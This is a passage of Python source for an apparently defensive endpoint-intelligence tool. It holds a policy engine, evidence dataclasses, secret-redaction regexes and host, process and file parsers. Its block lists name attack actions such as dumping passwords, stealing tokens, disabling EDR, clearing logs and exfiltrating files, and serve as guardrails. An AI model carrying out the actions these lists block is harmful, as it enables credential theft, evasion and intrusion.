from __future__ import annotations

import hashlib
import json
import logging
import re
import uuid
from collections import defaultdict
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta, timezone
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

# ==============================================================================
# TRACEATLAS — HOSTINT
# HOST / ENDPOINT / SYSTEM INTELLIGENCE AI EMPLOYEE
# MODE: DEFENSIVE / AUTHORIZED / EVIDENCE-FIRST / PASSIVE-FIRST
# ==============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
)
logger = logging.getLogger("TRACEATLAS.HOSTINT")


# ==============================================================================
# SECTION 13: HARD RESTRICTIONS / POLICY ENGINE
# ==============================================================================

class PolicyViolation(Exception):
    pass


PROHIBITED_SCOPE_FLAGS = (
    "allow_exploitation",
    "allow_unauthorized_shell_access",
    "allow_deploy_malware",
    "allow_install_persistence",
    "allow_create_backdoor",
    "allow_dump_passwords",
    "allow_dump_hashes_for_attack",
    "allow_extract_browser_passwords",
    "allow_steal_tokens",
    "allow_reuse_cookies",
    "allow_bypass_mfa",
    "allow_disable_edr",
    "allow_disable_av",
    "allow_disable_firewall",
    "allow_stop_security_services",
    "allow_tamper_logs",
    "allow_delete_forensic_evidence",
    "allow_clear_event_logs",
    "allow_modify_registry_for_persistence",
    "allow_create_malicious_scheduled_tasks",
    "allow_create_unauthorized_services",
    "allow_load_malicious_drivers",
    "allow_inject_processes",
    "allow_credential_theft",
    "allow_lateral_movement",
    "allow_privilege_escalation",
    "allow_evade_endpoint_controls",
    "allow_hide_processes",
    "allow_hide_files",
    "allow_disable_audit_controls",
    "allow_exfiltrate_files",
    "allow_wipe_devices",
    "allow_encrypt_data",
    "allow_destroy_evidence",
    "allow_password_spray",
    "allow_brute_force",
    "allow_unauthorized_endpoint_access",
    "allow_live_destructive_action",
)

PROHIBITED_OBJECTIVE_KEYWORDS = (
    "exploit",
    "unauthorized shell",
    "deploy malware",
    "install persistence",
    "create backdoor",
    "dump password",
    "dump hash",
    "extract browser password",
    "steal token",
    "reuse cookie",
    "bypass mfa",
    "disable edr",
    "kill edr",
    "bypass edr",
    "disable antivirus",
    "disable av",
    "disable firewall",
    "stop security service",
    "tamper log",
    "delete forensic evidence",
    "clear event log",
    "modify registry for persistence",
    "malicious scheduled task",
    "unauthorized service",
    "malicious driver",
    "inject process",
    "credential theft",
    "lateral movement",
    "privilege escalation",
    "evade endpoint",
    "hide process",
    "hide file",
    "disable audit",
    "exfiltrate file",
    "wipe device",
    "encrypt data",
    "destroy evidence",
    "password spray",
    "brute force",
    "unauthorized endpoint access",
    "remote execute",
    "run malware",
    "execute unknown binary",
)


def enforce_policy(objective: str, scope: Dict[str, Any]) -> None:
    """
    Enforces HOSTINT hard restrictions.

    Defensive, authorized, passive-first endpoint intelligence only.
    """
    if not isinstance(scope, dict):
        raise PolicyViolation("POLICY_BLOCKED: scope must be a dictionary.")

    mode = str(scope.get("mode", "AUTHORIZED_PASSIVE")).upper()
    allowed_modes = {
        "AUTHORIZED_PASSIVE",
        "AUTHORIZED_READONLY",
        "AUTHORIZED_LIVE_NONDESTRUCTIVE_READ_ONLY",
    }

    if mode not in allowed_modes:
        raise PolicyViolation(
            "POLICY_BLOCKED: HOSTINT requires authorized passive/read-only/live-non-destructive mode."
        )

    if mode == "AUTHORIZED_LIVE_NONDESTRUCTIVE_READ_ONLY":
        if not scope.get("authorized_live_nondestructive_read_only", False):
            raise PolicyViolation(
                "POLICY_BLOCKED: live host interrogation requires explicit authorization, "
                "non-destructive read-only configuration, bounding, and auditing."
            )

    for flag in PROHIBITED_SCOPE_FLAGS:
        if scope.get(flag, False):
            raise PolicyViolation(f"POLICY_BLOCKED: prohibited scope flag '{flag}'.")

    objective_lower = (objective or "").lower()
    for keyword in PROHIBITED_OBJECTIVE_KEYWORDS:
        if keyword in objective_lower:
            raise PolicyViolation(
                f"POLICY_BLOCKED: objective contains prohibited concept '{keyword}'."
            )


# ==============================================================================
# ENUMS / STATES
# ==============================================================================

class HostStatus(Enum):
    ACTIVE = auto()
    INACTIVE = auto()
    DECOMMISSIONED = auto()
    EPHEMERAL_TERMINATED = auto()
    UNKNOWN = auto()


class HostEraState(Enum):
    CURRENT = auto()
    HISTORICAL = auto()
    REBUILD = auto()
    REIMAGE = auto()
    MIGRATION = auto()
    UNKNOWN = auto()


class CompromiseState(Enum):
    NO_COMPROMISE_EVIDENCE = auto()
    ANOMALOUS_ACTIVITY = auto()
    SUSPICIOUS_ACTIVITY = auto()
    COMPROMISE_CANDIDATE = auto()
    COMPROMISE_SUPPORTED = auto()
    COMPROMISE_STRONGLY_SUPPORTED = auto()
    DISPUTED = auto()
    INCONCLUSIVE = auto()


class PersistenceState(Enum):
    PERSISTENCE_MECHANISM_OBSERVED = auto()
    PERSISTENCE_CANDIDATE = auto()
    LEGITIMATE_STARTUP_CANDIDATE = auto()
    UNKNOWN = auto()


class AnomalyState(Enum):
    EXPECTED = auto()
    UNUSUAL = auto()
    SUSPICIOUS = auto()
    MATERIAL_SECURITY_SIGNAL = auto()
    UNKNOWN = auto()


class SecurityControlState(Enum):
    ACTIVE = auto()
    DEGRADED = auto()
    OFFLINE = auto()
    DISABLED_REPORTED = auto()
    UNHEALTHY = auto()
    UNKNOWN = auto()


class SourceIndependenceState(Enum):
    INDEPENDENT = auto()
    PARTIALLY_DEPENDENT = auto()
    DEPENDENT = auto()
    UNKNOWN = auto()


class VerificationState(Enum):
    SUPPORTED = auto()
    PARTIALLY_SUPPORTED = auto()
    DISPUTED = auto()
    UNSUPPORTED = auto()
    INCONCLUSIVE = auto()


class HypothesisStatus(Enum):
    ACTIVE = auto()
    REJECTED = auto()
    CONFIRMED = auto()
    CANDIDATE = auto()
    INCONCLUSIVE = auto()


class IOCFreshness(Enum):
    CURRENT = auto()
    RECENT = auto()
    STALE = auto()
    UNKNOWN = auto()


class TTPState(Enum):
    TECHNIQUE_CANDIDATE = auto()
    TECHNIQUE_SUPPORTED = auto()
    TECHNIQUE_NOT_SUPPORTED = auto()


# ==============================================================================
# DATA OBJECTS
# ==============================================================================

@dataclass
class EvidenceRef:
    evidence_id: str
    case_id: str
    source_id: str
    upstream_source_id: str
    source_type: str
    kind: str
    observed_at: Optional[datetime]
    ingested_at: Optional[datetime]
    reliability: float
    limitations: List[str] = field(default_factory=list)


@dataclass
class HostEra:
    era_id: str
    host_id: str
    state: HostEraState
    valid_from: Optional[datetime]
    valid_to: Optional[datetime]
    trigger: Optional[str]
    evidence_ids: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)


@dataclass
class HostObject:
    host_id: str
    asset_id: Optional[str]
    hostname: Optional[str]
    device_id: Optional[str]
    serial_reference: Optional[str]
    platform: Optional[str]
    os_family: Optional[str]
    os_version: Optional[str]
    os_build: Optional[str]
    kernel_version: Optional[str]
    architecture: Optional[str]
    hardware_model: Optional[str]
    firmware_version: Optional[str]
    domain_or_tenant: Optional[str]
    business_owner: Optional[str]
    technical_owner: Optional[str]
    criticality: Optional[str]
    first_seen: Optional[datetime]
    last_seen: Optional[datetime]
    status: HostStatus
    sources: List[str]
    confidence: float
    host_eras: List[HostEra] = field(default_factory=list)
    evidence_ids: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ProcessObject:
    process_id: str
    host_id: Optional[str]
    host_era_id: Optional[str]
    pid: Optional[int]
    ppid: Optional[int]
    image: Optional[str]
    path: Optional[str]
    command_line_redacted: Optional[str]
    user_context: Optional[str]
    privilege_context: Optional[str]
    start_time: Optional[datetime]
    end_time: Optional[datetime]
    sha256: Optional[str]
    signature_context: Dict[str, Any] = field(default_factory=dict)
    parent_process_id: Optional[str] = None
    child_process_ids: List[str] = field(default_factory=list)
    network_connection_ids: List[str] = field(default_factory=list)
    loaded_module_ids: List[str] = field(default_factory=list)
    source_type: Optional[str] = None
    confidence: float = 0.5
    evidence_ids: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ServiceObject:
    service_id: str
    host_id: Optional[str]
    name: Optional[str]
    display_name: Optional[str]
    binary_path: Optional[str]
    start_type: Optional[str]
    account: Optional[str]
    state: Optional[str]
    created_at: Optional[datetime]
    modified_at: Optional[datetime]
    sha256: Optional[str]
    publisher: Optional[str]
    signature_valid: Optional[bool]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ScheduledTaskObject:
    task_id: str
    host_id: Optional[str]
    name: Optional[str]
    schedule: Optional[str]
    action: Optional[str]
    principal: Optional[str]
    created_at: Optional[datetime]
    modified_at: Optional[datetime]
    state: Optional[str]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class FileObject:
    file_id: str
    host_id: Optional[str]
    path: Optional[str]
    filename: Optional[str]
    size: Optional[int]
    sha256: Optional[str]
    md5: Optional[str]
    created_at: Optional[datetime]
    modified_at: Optional[datetime]
    accessed_at: Optional[datetime]
    metadata_changed_at: Optional[datetime]
    owner: Optional[str]
    permissions: Optional[str]
    publisher: Optional[str]
    signature_valid: Optional[bool]
    mime_type: Optional[str]
    first_seen: Optional[datetime]
    last_seen: Optional[datetime]
    embedded_iocs: List[str] = field(default_factory=list)
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SecurityControlObject:
    control_id: str
    host_id: Optional[str]
    control_type: str
    product: Optional[str]
    version: Optional[str]
    state: SecurityControlState
    last_updated: Optional[datetime]
    healthy: Optional[bool]
    policy: Optional[str]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ConnectionObject:
    connection_id: str
    host_id: Optional[str]
    local_process_id: Optional[str]
    local_pid: Optional[int]
    local_endpoint: Optional[str]
    remote_ip: Optional[str]
    remote_domain: Optional[str]
    remote_port: Optional[int]
    protocol: Optional[str]
    state: Optional[str]
    bytes_sent: Optional[int]
    bytes_received: Optional[int]
    start_time: Optional[datetime]
    end_time: Optional[datetime]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class DNSArtifactObject:
    dns_id: str
    host_id: Optional[str]
    process_id: Optional[str]
    queried_domain: Optional[str]
    query_type: Optional[str]
    timestamp: Optional[datetime]
    resolved_ips: List[str] = field(default_factory=list)
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AlertObject:
    alert_id: str
    host_id: Optional[str]
    alert_name: Optional[str]
    rule: Optional[str]
    severity: Optional[str]
    detection_time: Optional[datetime]
    process_id: Optional[str]
    file_id: Optional[str]
    ioc: Optional[str]
    upstream_event_id: Optional[str]
    correlation_id: Optional[str]
    status: Optional[str]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class IOCObject:
    ioc_id: str
    ioc_type: str
    value: str
    first_published: Optional[datetime]
    last_updated: Optional[datetime]
    current_status: Optional[str]
    source: Optional[str]
    campaign: Optional[str]
    malware_family: Optional[str]
    confidence: float
    evidence_ids: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class IocMatch:
    match_id: str
    ioc_id: str
    host_id: Optional[str]
    relation_type: str
    observed: bool
    object_type: str
    object_id: str
    value: str
    timestamp: Optional[datetime]
    freshness: IOCFreshness
    confidence: float
    evidence_ids: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)


@dataclass
class BaselineObject:
    baseline_id: str
    host_id: Optional[str]
    version: Optional[str]
    expected_software: List[str] = field(default_factory=list)
    expected_services: List[str] = field(default_factory=list)
    expected_tasks: List[str] = field(default_factory=list)
    expected_ports: List[int] = field(default_factory=list)
    expected_processes: List[str] = field(default_factory=list)
    expected_users: List[str] = field(default_factory=list)
    expected_config: Dict[str, Any] = field(default_factory=dict)
    normal_connections: List[str] = field(default_factory=list)
    source: Optional[str] = None
    valid_from: Optional[datetime] = None
    valid_to: Optional[datetime] = None
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)


@dataclass
class ChangeObject:
    change_id: str
    host_id: Optional[str]
    change_type: str
    object_id: Optional[str]
    old_value: Optional[str]
    new_value: Optional[str]
    detected_at: Optional[datetime]
    source: Optional[str]
    baseline_id: Optional[str]
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)


@dataclass
class AnomalyObject:
    anomaly_id: str
    host_id: Optional[str]
    artifact: str
    baseline: Optional[str]
    difference: str
    first_seen: Optional[datetime]
    last_seen: Optional[datetime]
    severity: AnomalyState
    context: str
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)


@dataclass
class PersistenceIndicator:
    indicator_id: str
    host_id: Optional[str]
    mechanism: str
    object_id: Optional[str]
    state: PersistenceState
    reason: str
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)


@dataclass
class TtpMapping:
    mapping_id: str
    host_id: Optional[str]
    technique_id: str
    technique_name: str
    behavior: str
    state: TTPState
    evidence_ids: List[str] = field(default_factory=list)
    confidence: float = 0.5
    limitations: List[str] = field(default_factory=list)


@dataclass
class FactRecord:
    fact_id: str
    statement: str
    claim_type: str
    verification_state: VerificationState
    evidence_ids: List[str]
    object_ids: List[str]
    confidence: float
    limitations: List[str]


@dataclass
class Hypothesis:
    id: str
    description: str
    support_evidence: List[str]
    opposition_evidence: List[str]
    unknowns: List[str]
    falsification_criteria: str
    status: HypothesisStatus


@dataclass
class GraphNode:
    node_id: str
    type: str
    attributes: Dict[str, Any]


@dataclass
class GraphEdge:
    edge_id: str
    source_node_id: str
    target_node_id: str
    relation: str
    confidence: float
    evidence_ids: List[str]


# ==============================================================================
# CONSTANTS
# ==============================================================================

SOURCE_RELIABILITY = {
    "edr": 0.92,
    "xdr": 0.90,
    "sysmon": 0.88,
    "windows_event_log": 0.86,
    "linux_journal": 0.84,
    "macos_unified_log": 0.84,
    "osquery": 0.82,
    "mdm": 0.80,
    "cmdb": 0.78,
    "asset_inventory": 0.78,
    "configuration_management": 0.80,
    "package_inventory": 0.76,
    "software_inventory": 0.76,
    "patch_management": 0.82,
    "av_telemetry": 0.80,
    "firewall_telemetry": 0.78,
    "forensic_image": 0.90,
    "memory_analysis_output": 0.82,
    "filesystem_metadata": 0.80,
    "registry_export": 0.82,
    "container_inventory": 0.74,
    "cloud_workload_inventory": 0.76,
    "vm_inventory": 0.76,
    "identity_telemetry": 0.80,
    "siem": 0.84,
    "threat_feed": 0.62,
    "user_report": 0.45,
    "scanner_output": 0.55,
    "third_party_aggregator": 0.30,
    "search_result": 0.25,
    "unknown": 0.20,
}

CREDENTIAL_FIELD_TOKENS = (
    "password",
    "passwd",
    "pwd",
    "token",
    "api_key",
    "apikey",
    "secret",
    "private_key",
    "privatekey",
    "cookie",
    "session",
    "mfa",
    "otp",
    "credential",
)

SECRET_REGEXES = [
    re.compile(
        r"(?i)\b(password|passwd|pwd|token|secret|api[_-]?key|apikey|private[_-]?key|cookie|session[_-]?id|mfa|otp|credential)\b\s*[:=]\s*[^\s,;&]+"
    ),
    re.compile(r"(?i)\bbearer\s+[A-Za-z0-9._\-]+"),
    re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"),
]

SCRIPT_INTERPRETERS = {
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "bash",
    "sh",
    "zsh",
    "python",
    "python3",
    "perl",
    "ruby",
    "node",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "regsvr32.exe",
    "rundll32.exe",
}

HIGH_TRUST_SOURCES = {
    "edr",
    "xdr",
    "sysmon",
    "windows_event_log",
    "linux_journal",
    "macos_unified_log",
    "forensic_image",
    "memory_analysis_output",
}

OBSERVED_IOC_RELATIONS = {
    "NETWORK_CONNECTION_OBSERVED",
    "DNS_RESOLUTION_OBSERVED",
    "PROCESS_EXECUTED_IOC_HASH",
    "PROCESS_EXECUTED_IOC_NAME",
    "SERVICE_IOC_BINARY_PATH",
    "TASK_IOC_ACTION_PATH",
}


# ==============================================================================
# HELPERS
# ==============================================================================

def new_id(prefix: str) -> str:
    return f"{prefix}_{uuid.uuid4().hex[:12]}"


def stable_id(prefix: str, *parts: Any) -> str:
    raw = "|".join(str(p) for p in parts)
    digest = hashlib.sha256(raw.encode("utf-8", errors="ignore")).hexdigest()
    return f"{prefix}_{digest[:12]}"


def json_serial(obj: Any) -> Any:
    if isinstance(obj, datetime):
        return obj.isoformat()
    if isinstance(obj, Enum):
        return obj.name
    if hasattr(obj, "__dataclass_fields__"):
        return asdict(obj)
    if isinstance(obj, set):
        return sorted(obj)
    return str(obj)


def clamp(value: float, low: float = 0.0, high: float = 1.0) -> float:
    return max(low, min(high, value))


def enum_from_name(enum_cls: Any, name: Any, default: Any) -> Any:
    try:
        return enum_cls[str(name).upper()]
    except Exception:
        return default


def parse_dt(value: Any) -> Optional[datetime]:
    if value is None:
        return None

    if isinstance(value, datetime):
        if value.tzinfo is None:
            return value.replace(tzinfo=timezone.utc)
        return value.astimezone(timezone.utc)

    text = str(value).strip()
    if not text:
        return None

    text = text.replace("Z", "+00:00")

    try:
        dt = datetime.fromisoformat(text)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt.astimezone(timezone.utc)
    except ValueError:
        pass

    for fmt in (
        "%Y-%m-%dT%H:%M:%S%z",
        "%Y-%m-%dT%H:%M:%S.%f%z",
        "%Y-%m-%d %H:%M:%S",
        "%Y-%m-%d %H:%M",
        "%Y-%m-%d",
    ):
        try:
            dt = datetime.strptime(text, fmt)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt.astimezone(timezone.utc)
        except ValueError:
            continue

    return None


def redact_command_line(cmd: Optional[str]) -> Optional[str]:
    if cmd is None:
        return None

    s = str(cmd)

    for rx in SECRET_REGEXES:
        s = rx.sub("[REDACTED_SECRET]", s)

    return s


def is_credential_field(key: str) -> bool:
    k = str(key).lower()
    return any(token in k for token in CREDENTIAL_FIELD_TOKENS)


def redact_mapping(mapping: Dict[str, Any]) -> Dict[str, Any]:
    out: Dict[str, Any] = {}

    for key, value in (mapping or {}).items():
        if is_credential_field(str(key)):
            out[key] = "[REDACTED_CREDENTIAL_ARTIFACT]"
        elif isinstance(value, str):
            out[key] = redact_command_line(value) or value
        elif isinstance(value, dict):
            out[key] = redact_mapping(value)
        elif isinstance(value, list):
            out[key] = [
                redact_command_line(x) if isinstance(x, str) else redact_mapping(x) if isinstance(x, dict) else x
                for x in value
            ]
        else:
            out[key] = value

    return out


def make_evidence(
    item: Dict[str, Any],
    case_id: str,
    kind: str,
    now: datetime,
    default_source_type: str = "unknown",
) -> EvidenceRef:
    source_type = str(item.get("source_type") or default_source_type)
    reliability = float(item.get("reliability", SOURCE_RELIABILITY.get(source_type, 0.20)))

    observed_at = parse_dt(
        item.get("observed_at")
        or item.get("event_at")
        or item.get("timestamp")
        or item.get("first_seen")
        or item.get("detection_time")
        or item.get("start_time")
        or item.get("created_at")
    )

    ingested_at = parse_dt(item.get("ingested_at")) or now

    limitations: List[str] = list(item.get("limitations", []) or [])

    if observed_at is None:
        limitations.append("EVENT_TIME_UNRESOLVED")

    if source_type in {"search_result", "third_party_aggregator", "user_report"}:
        limitations.append("LOW_SOURCE_AUTHORITY")

    ev = EvidenceRef(
        evidence_id=new_id("EVID"),
        case_id=case_id,
        source_id=str(item.get("source_id") or "UNKNOWN_SOURCE"),
        upstream_source_id=str(item.get("upstream_source_id") or item.get("source_id") or "UNKNOWN_UPSTREAM"),
        source_type=source_type,
        kind=kind,
        observed_at=observed_at,
        ingested_at=ingested_at,
        reliability=clamp(reliability),
        limitations=sorted(set(limitations)),
    )

    item.setdefault("evidence_ids", [])
    item["evidence_ids"].append(ev.evidence_id)

    item.setdefault("confidence", ev.reliability)
    item.setdefault("limitations", [])
    item["limitations"] = sorted(set(list(item["limitations"]) + ev.limitations))

    return ev


# ==============================================================================
# PARSERS
# ==============================================================================

def parse_host(
    h: Dict[str, Any],
    case_id: str,
    now: datetime,
    evidences: List[EvidenceRef],
) -> HostObject:
    ev = make_evidence(h, case_id, "host_record", now, "cmdb")
    evidences.append(ev)

    host_id = str(
        h.get("host_id")
        or h.get("asset_id")
        or h.get("device_id")
        or stable_id("HOST", h.get("hostname"), h.get("os_version"), h.get("domain_or_tenant"))
    )

    eras: List[HostEra] = []

    for idx, era in enumerate(h.get("host_eras", []) or []):
        era_ev = make_evidence(era, case_id, "host_era", now, "cmdb")
        evidences.append(era_ev)

        eras.append(
            HostEra(
                era_id=str(era.get("era_id") or stable_id("ERA", host_id, idx, era.get("trigger"))),
                host_id=host_id,
                state=enum_from_name(HostEraState, era.get("state"), HostEraState.UNKNOWN),
                valid_from=parse_dt(era.get("valid_from") or era.get("first_seen")),
                valid_to=parse_dt(era.get("valid_to") or era.get("last_seen")),
                trigger=era.get("trigger"),
                evidence_ids=[era_ev.evidence_id],
                limitations=list(era.get("limitations", []) or []),
            )
        )

    if not eras:
        eras.append(
            HostEra(
                era_id=stable_id("ERA", host_id, "current"),
                host_id=host_id,
                state=HostEraState.CURRENT,
                valid_from=parse_dt(h.get("first_seen")),
                valid_to=parse_dt(h.get("last_seen")),
                trigger="provided_host_record",
                evidence_ids=[ev.evidence_id],
                limitations=["Host era inferred from supplied host record; rebuild/reimage history may be incomplete."],
            )
        )

    limitations: List[str] = list(h.get("limitations", []) or [])

    if not h.get("device_id") and not h.get("asset_id") and not h.get("serial_reference"):
        limitations.append("HOST_IDENTITY_RELIES_ON_HOSTNAME_OR_WEAK_ID")

    if h.get("hostname_reused") or h.get("duplicate_hostname"):
        limitations.append("HOSTNAME_MAY_BE_RECYCLED")

    confidence = float(h.get("confidence", 0.80 if (h.get("device_id") or h.get("asset_id")) else 0.45))

    return HostObject(
        host_id=host_id,
        asset_id=h.get("asset_id"),
        hostname=h.get("hostname"),
        device_id=h.get("device_id"),
        serial_reference=h.get("serial_reference"),
        platform=h.get("platform"),
        os_family=h.get("os_family"),
        os_version=h.get("os_version"),
        os_build=h.get("os_build"),
        kernel_version=h.get("kernel_version"),
        architecture=h.get("architecture"),
        hardware_model=h.get("hardware_model"),
        firmware_version=h.get("firmware_version"),
        domain_or_tenant=h.get("domain_or_tenant"),
        business_owner=h.get("business_owner"),
        technical_owner=h.get("technical_owner"),
        criticality=h.get("criticality"),
        first_seen=parse_dt(h.get("first_seen")),
        last_seen=parse_dt(h.get("last_seen")),
        status=enum_from_name(HostStatus, h.get("status"), HostStatus.UNKNOWN),
        sources=sorted({ev.source_id, ev.upstream_source_id}),
        confidence=clamp(confidence),
        host_eras=eras,
        evidence_ids=[ev.evidence_id],
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in h.items() if k not in {"host_eras", "evidence_ids", "limitations", "confidence"}}),
    )


def parse_process(
    p: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> ProcessObject:
    ev = make_evidence(p, case_id, "process_observation", now, "edr")
    evidences.append(ev)

    host_id = p.get("host_id") or default_host_id
    pid = p.get("pid")
    start_time = parse_dt(p.get("start_time") or p.get("event_at") or p.get("observed_at"))

    process_id = str(
        p.get("process_id")
        or stable_id("PROC", host_id, pid, start_time.isoformat() if start_time else "na", p.get("path") or p.get("image"))
    )

    raw_cmd = p.get("command_line")
    redacted_cmd = redact_command_line(raw_cmd)

    limitations: List[str] = list(p.get("limitations", []) or [])

    if start_time is None:
        limitations.append("PROCESS_START_TIME_UNRESOLVED")

    if not p.get("path") and not p.get("image"):
        limitations.append("PROCESS_IDENTITY_INCOMPLETE")

    if raw_cmd and redacted_cmd != raw_cmd:
        limitations.append("COMMAND_LINE_REDACTED_FOR_SECRET_PROTECTION")

    signature_context = redact_mapping(p.get("signature_context", {}) or {})

    return ProcessObject(
        process_id=process_id,
        host_id=host_id,
        host_era_id=p.get("host_era_id"),
        pid=int(pid) if pid is not None else None,
        ppid=int(p["ppid"]) if p.get("ppid") is not None else None,
        image=p.get("image"),
        path=p.get("path"),
        command_line_redacted=redacted_cmd,
        user_context=p.get("user_context") or p.get("user") or p.get("account"),
        privilege_context=p.get("privilege_context"),
        start_time=start_time,
        end_time=parse_dt(p.get("end_time")),
        sha256=p.get("sha256") or p.get("hash"),
        signature_context=signature_context,
        source_type=ev.source_type,
        confidence=clamp(float(p.get("confidence", ev.reliability))),
        evidence_ids=[ev.evidence_id],
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in p.items() if k not in {"evidence_ids", "limitations", "confidence", "command_line"}}),
    )


def parse_service(
    s: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> ServiceObject:
    ev = make_evidence(s, case_id, "service_observation", now, "configuration_management")
    evidences.append(ev)

    host_id = s.get("host_id") or default_host_id
    service_id = str(s.get("service_id") or stable_id("SVC", host_id, s.get("name"), s.get("binary_path")))

    limitations: List[str] = list(s.get("limitations", []) or [])

    if not s.get("binary_path"):
        limitations.append("SERVICE_BINARY_PATH_MISSING")

    if not s.get("publisher") and s.get("signature_valid") is None:
        limitations.append("SERVICE_SIGNATURE_CONTEXT_INCOMPLETE")

    return ServiceObject(
        service_id=service_id,
        host_id=host_id,
        name=s.get("name"),
        display_name=s.get("display_name"),
        binary_path=s.get("binary_path"),
        start_type=s.get("start_type"),
        account=s.get("account"),
        state=s.get("state"),
        created_at=parse_dt(s.get("created_at")),
        modified_at=parse_dt(s.get("modified_at")),
        sha256=s.get("sha256"),
        publisher=s.get("publisher"),
        signature_valid=s.get("signature_valid"),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(s.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in s.items() if k not in {"evidence_ids", "limitations", "confidence"}}),
    )


def parse_task(
    t: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> ScheduledTaskObject:
    ev = make_evidence(t, case_id, "scheduled_task_observation", now, "configuration_management")
    evidences.append(ev)

    host_id = t.get("host_id") or default_host_id
    task_id = str(t.get("task_id") or stable_id("TASK", host_id, t.get("name"), t.get("action")))

    limitations: List[str] = list(t.get("limitations", []) or [])

    if not t.get("action"):
        limitations.append("TASK_ACTION_MISSING")

    return ScheduledTaskObject(
        task_id=task_id,
        host_id=host_id,
        name=t.get("name"),
        schedule=t.get("schedule"),
        action=redact_command_line(t.get("action")) or t.get("action"),
        principal=t.get("principal"),
        created_at=parse_dt(t.get("created_at")),
        modified_at=parse_dt(t.get("modified_at")),
        state=t.get("state"),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(t.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in t.items() if k not in {"evidence_ids", "limitations", "confidence", "action"}}),
    )


def parse_file(
    f: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> FileObject:
    ev = make_evidence(f, case_id, "file_observation", now, "filesystem_metadata")
    evidences.append(ev)

    host_id = f.get("host_id") or default_host_id
    file_id = str(f.get("file_id") or stable_id("FILE", host_id, f.get("path"), f.get("sha256")))

    limitations: List[str] = list(f.get("limitations", []) or [])

    if not f.get("sha256"):
        limitations.append("FILE_HASH_MISSING")

    if f.get("created_at") and f.get("modified_at"):
        if parse_dt(f.get("created_at")) and parse_dt(f.get("modified_at")):
            if parse_dt(f.get("created_at")) > parse_dt(f.get("modified_at")):
                limitations.append("FILE_TIMESTAMP_ORDER_ANOMALY_CANDIDATE")

    return FileObject(
        file_id=file_id,
        host_id=host_id,
        path=f.get("path"),
        filename=f.get("filename"),
        size=int(f["size"]) if f.get("size") is not None else None,
        sha256=f.get("sha256"),
        md5=f.get("md5"),
        created_at=parse_dt(f.get("created_at")),
        modified_at=parse_dt(f.get("modified_at")),
        accessed_at=parse_dt(f.get("accessed_at")),
        metadata_changed_at=parse_dt(f.get("metadata_changed_at")),
        owner=f.get("owner"),
        permissions=f.get("permissions"),
        publisher=f.get("publisher"),
        signature_valid=f.get("signature_valid"),
        mime_type=f.get("mime_type"),
        first_seen=parse_dt(f.get("first_seen")),
        last_seen=parse_dt(f.get("last_seen")),
        embedded_iocs=[str(x) for x in f.get("embedded_iocs", []) or []],
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(f.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in f.items() if k not in {"evidence_ids", "limitations", "confidence", "embedded_iocs"}}),
    )


def parse_security_control(
    c: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> SecurityControlObject:
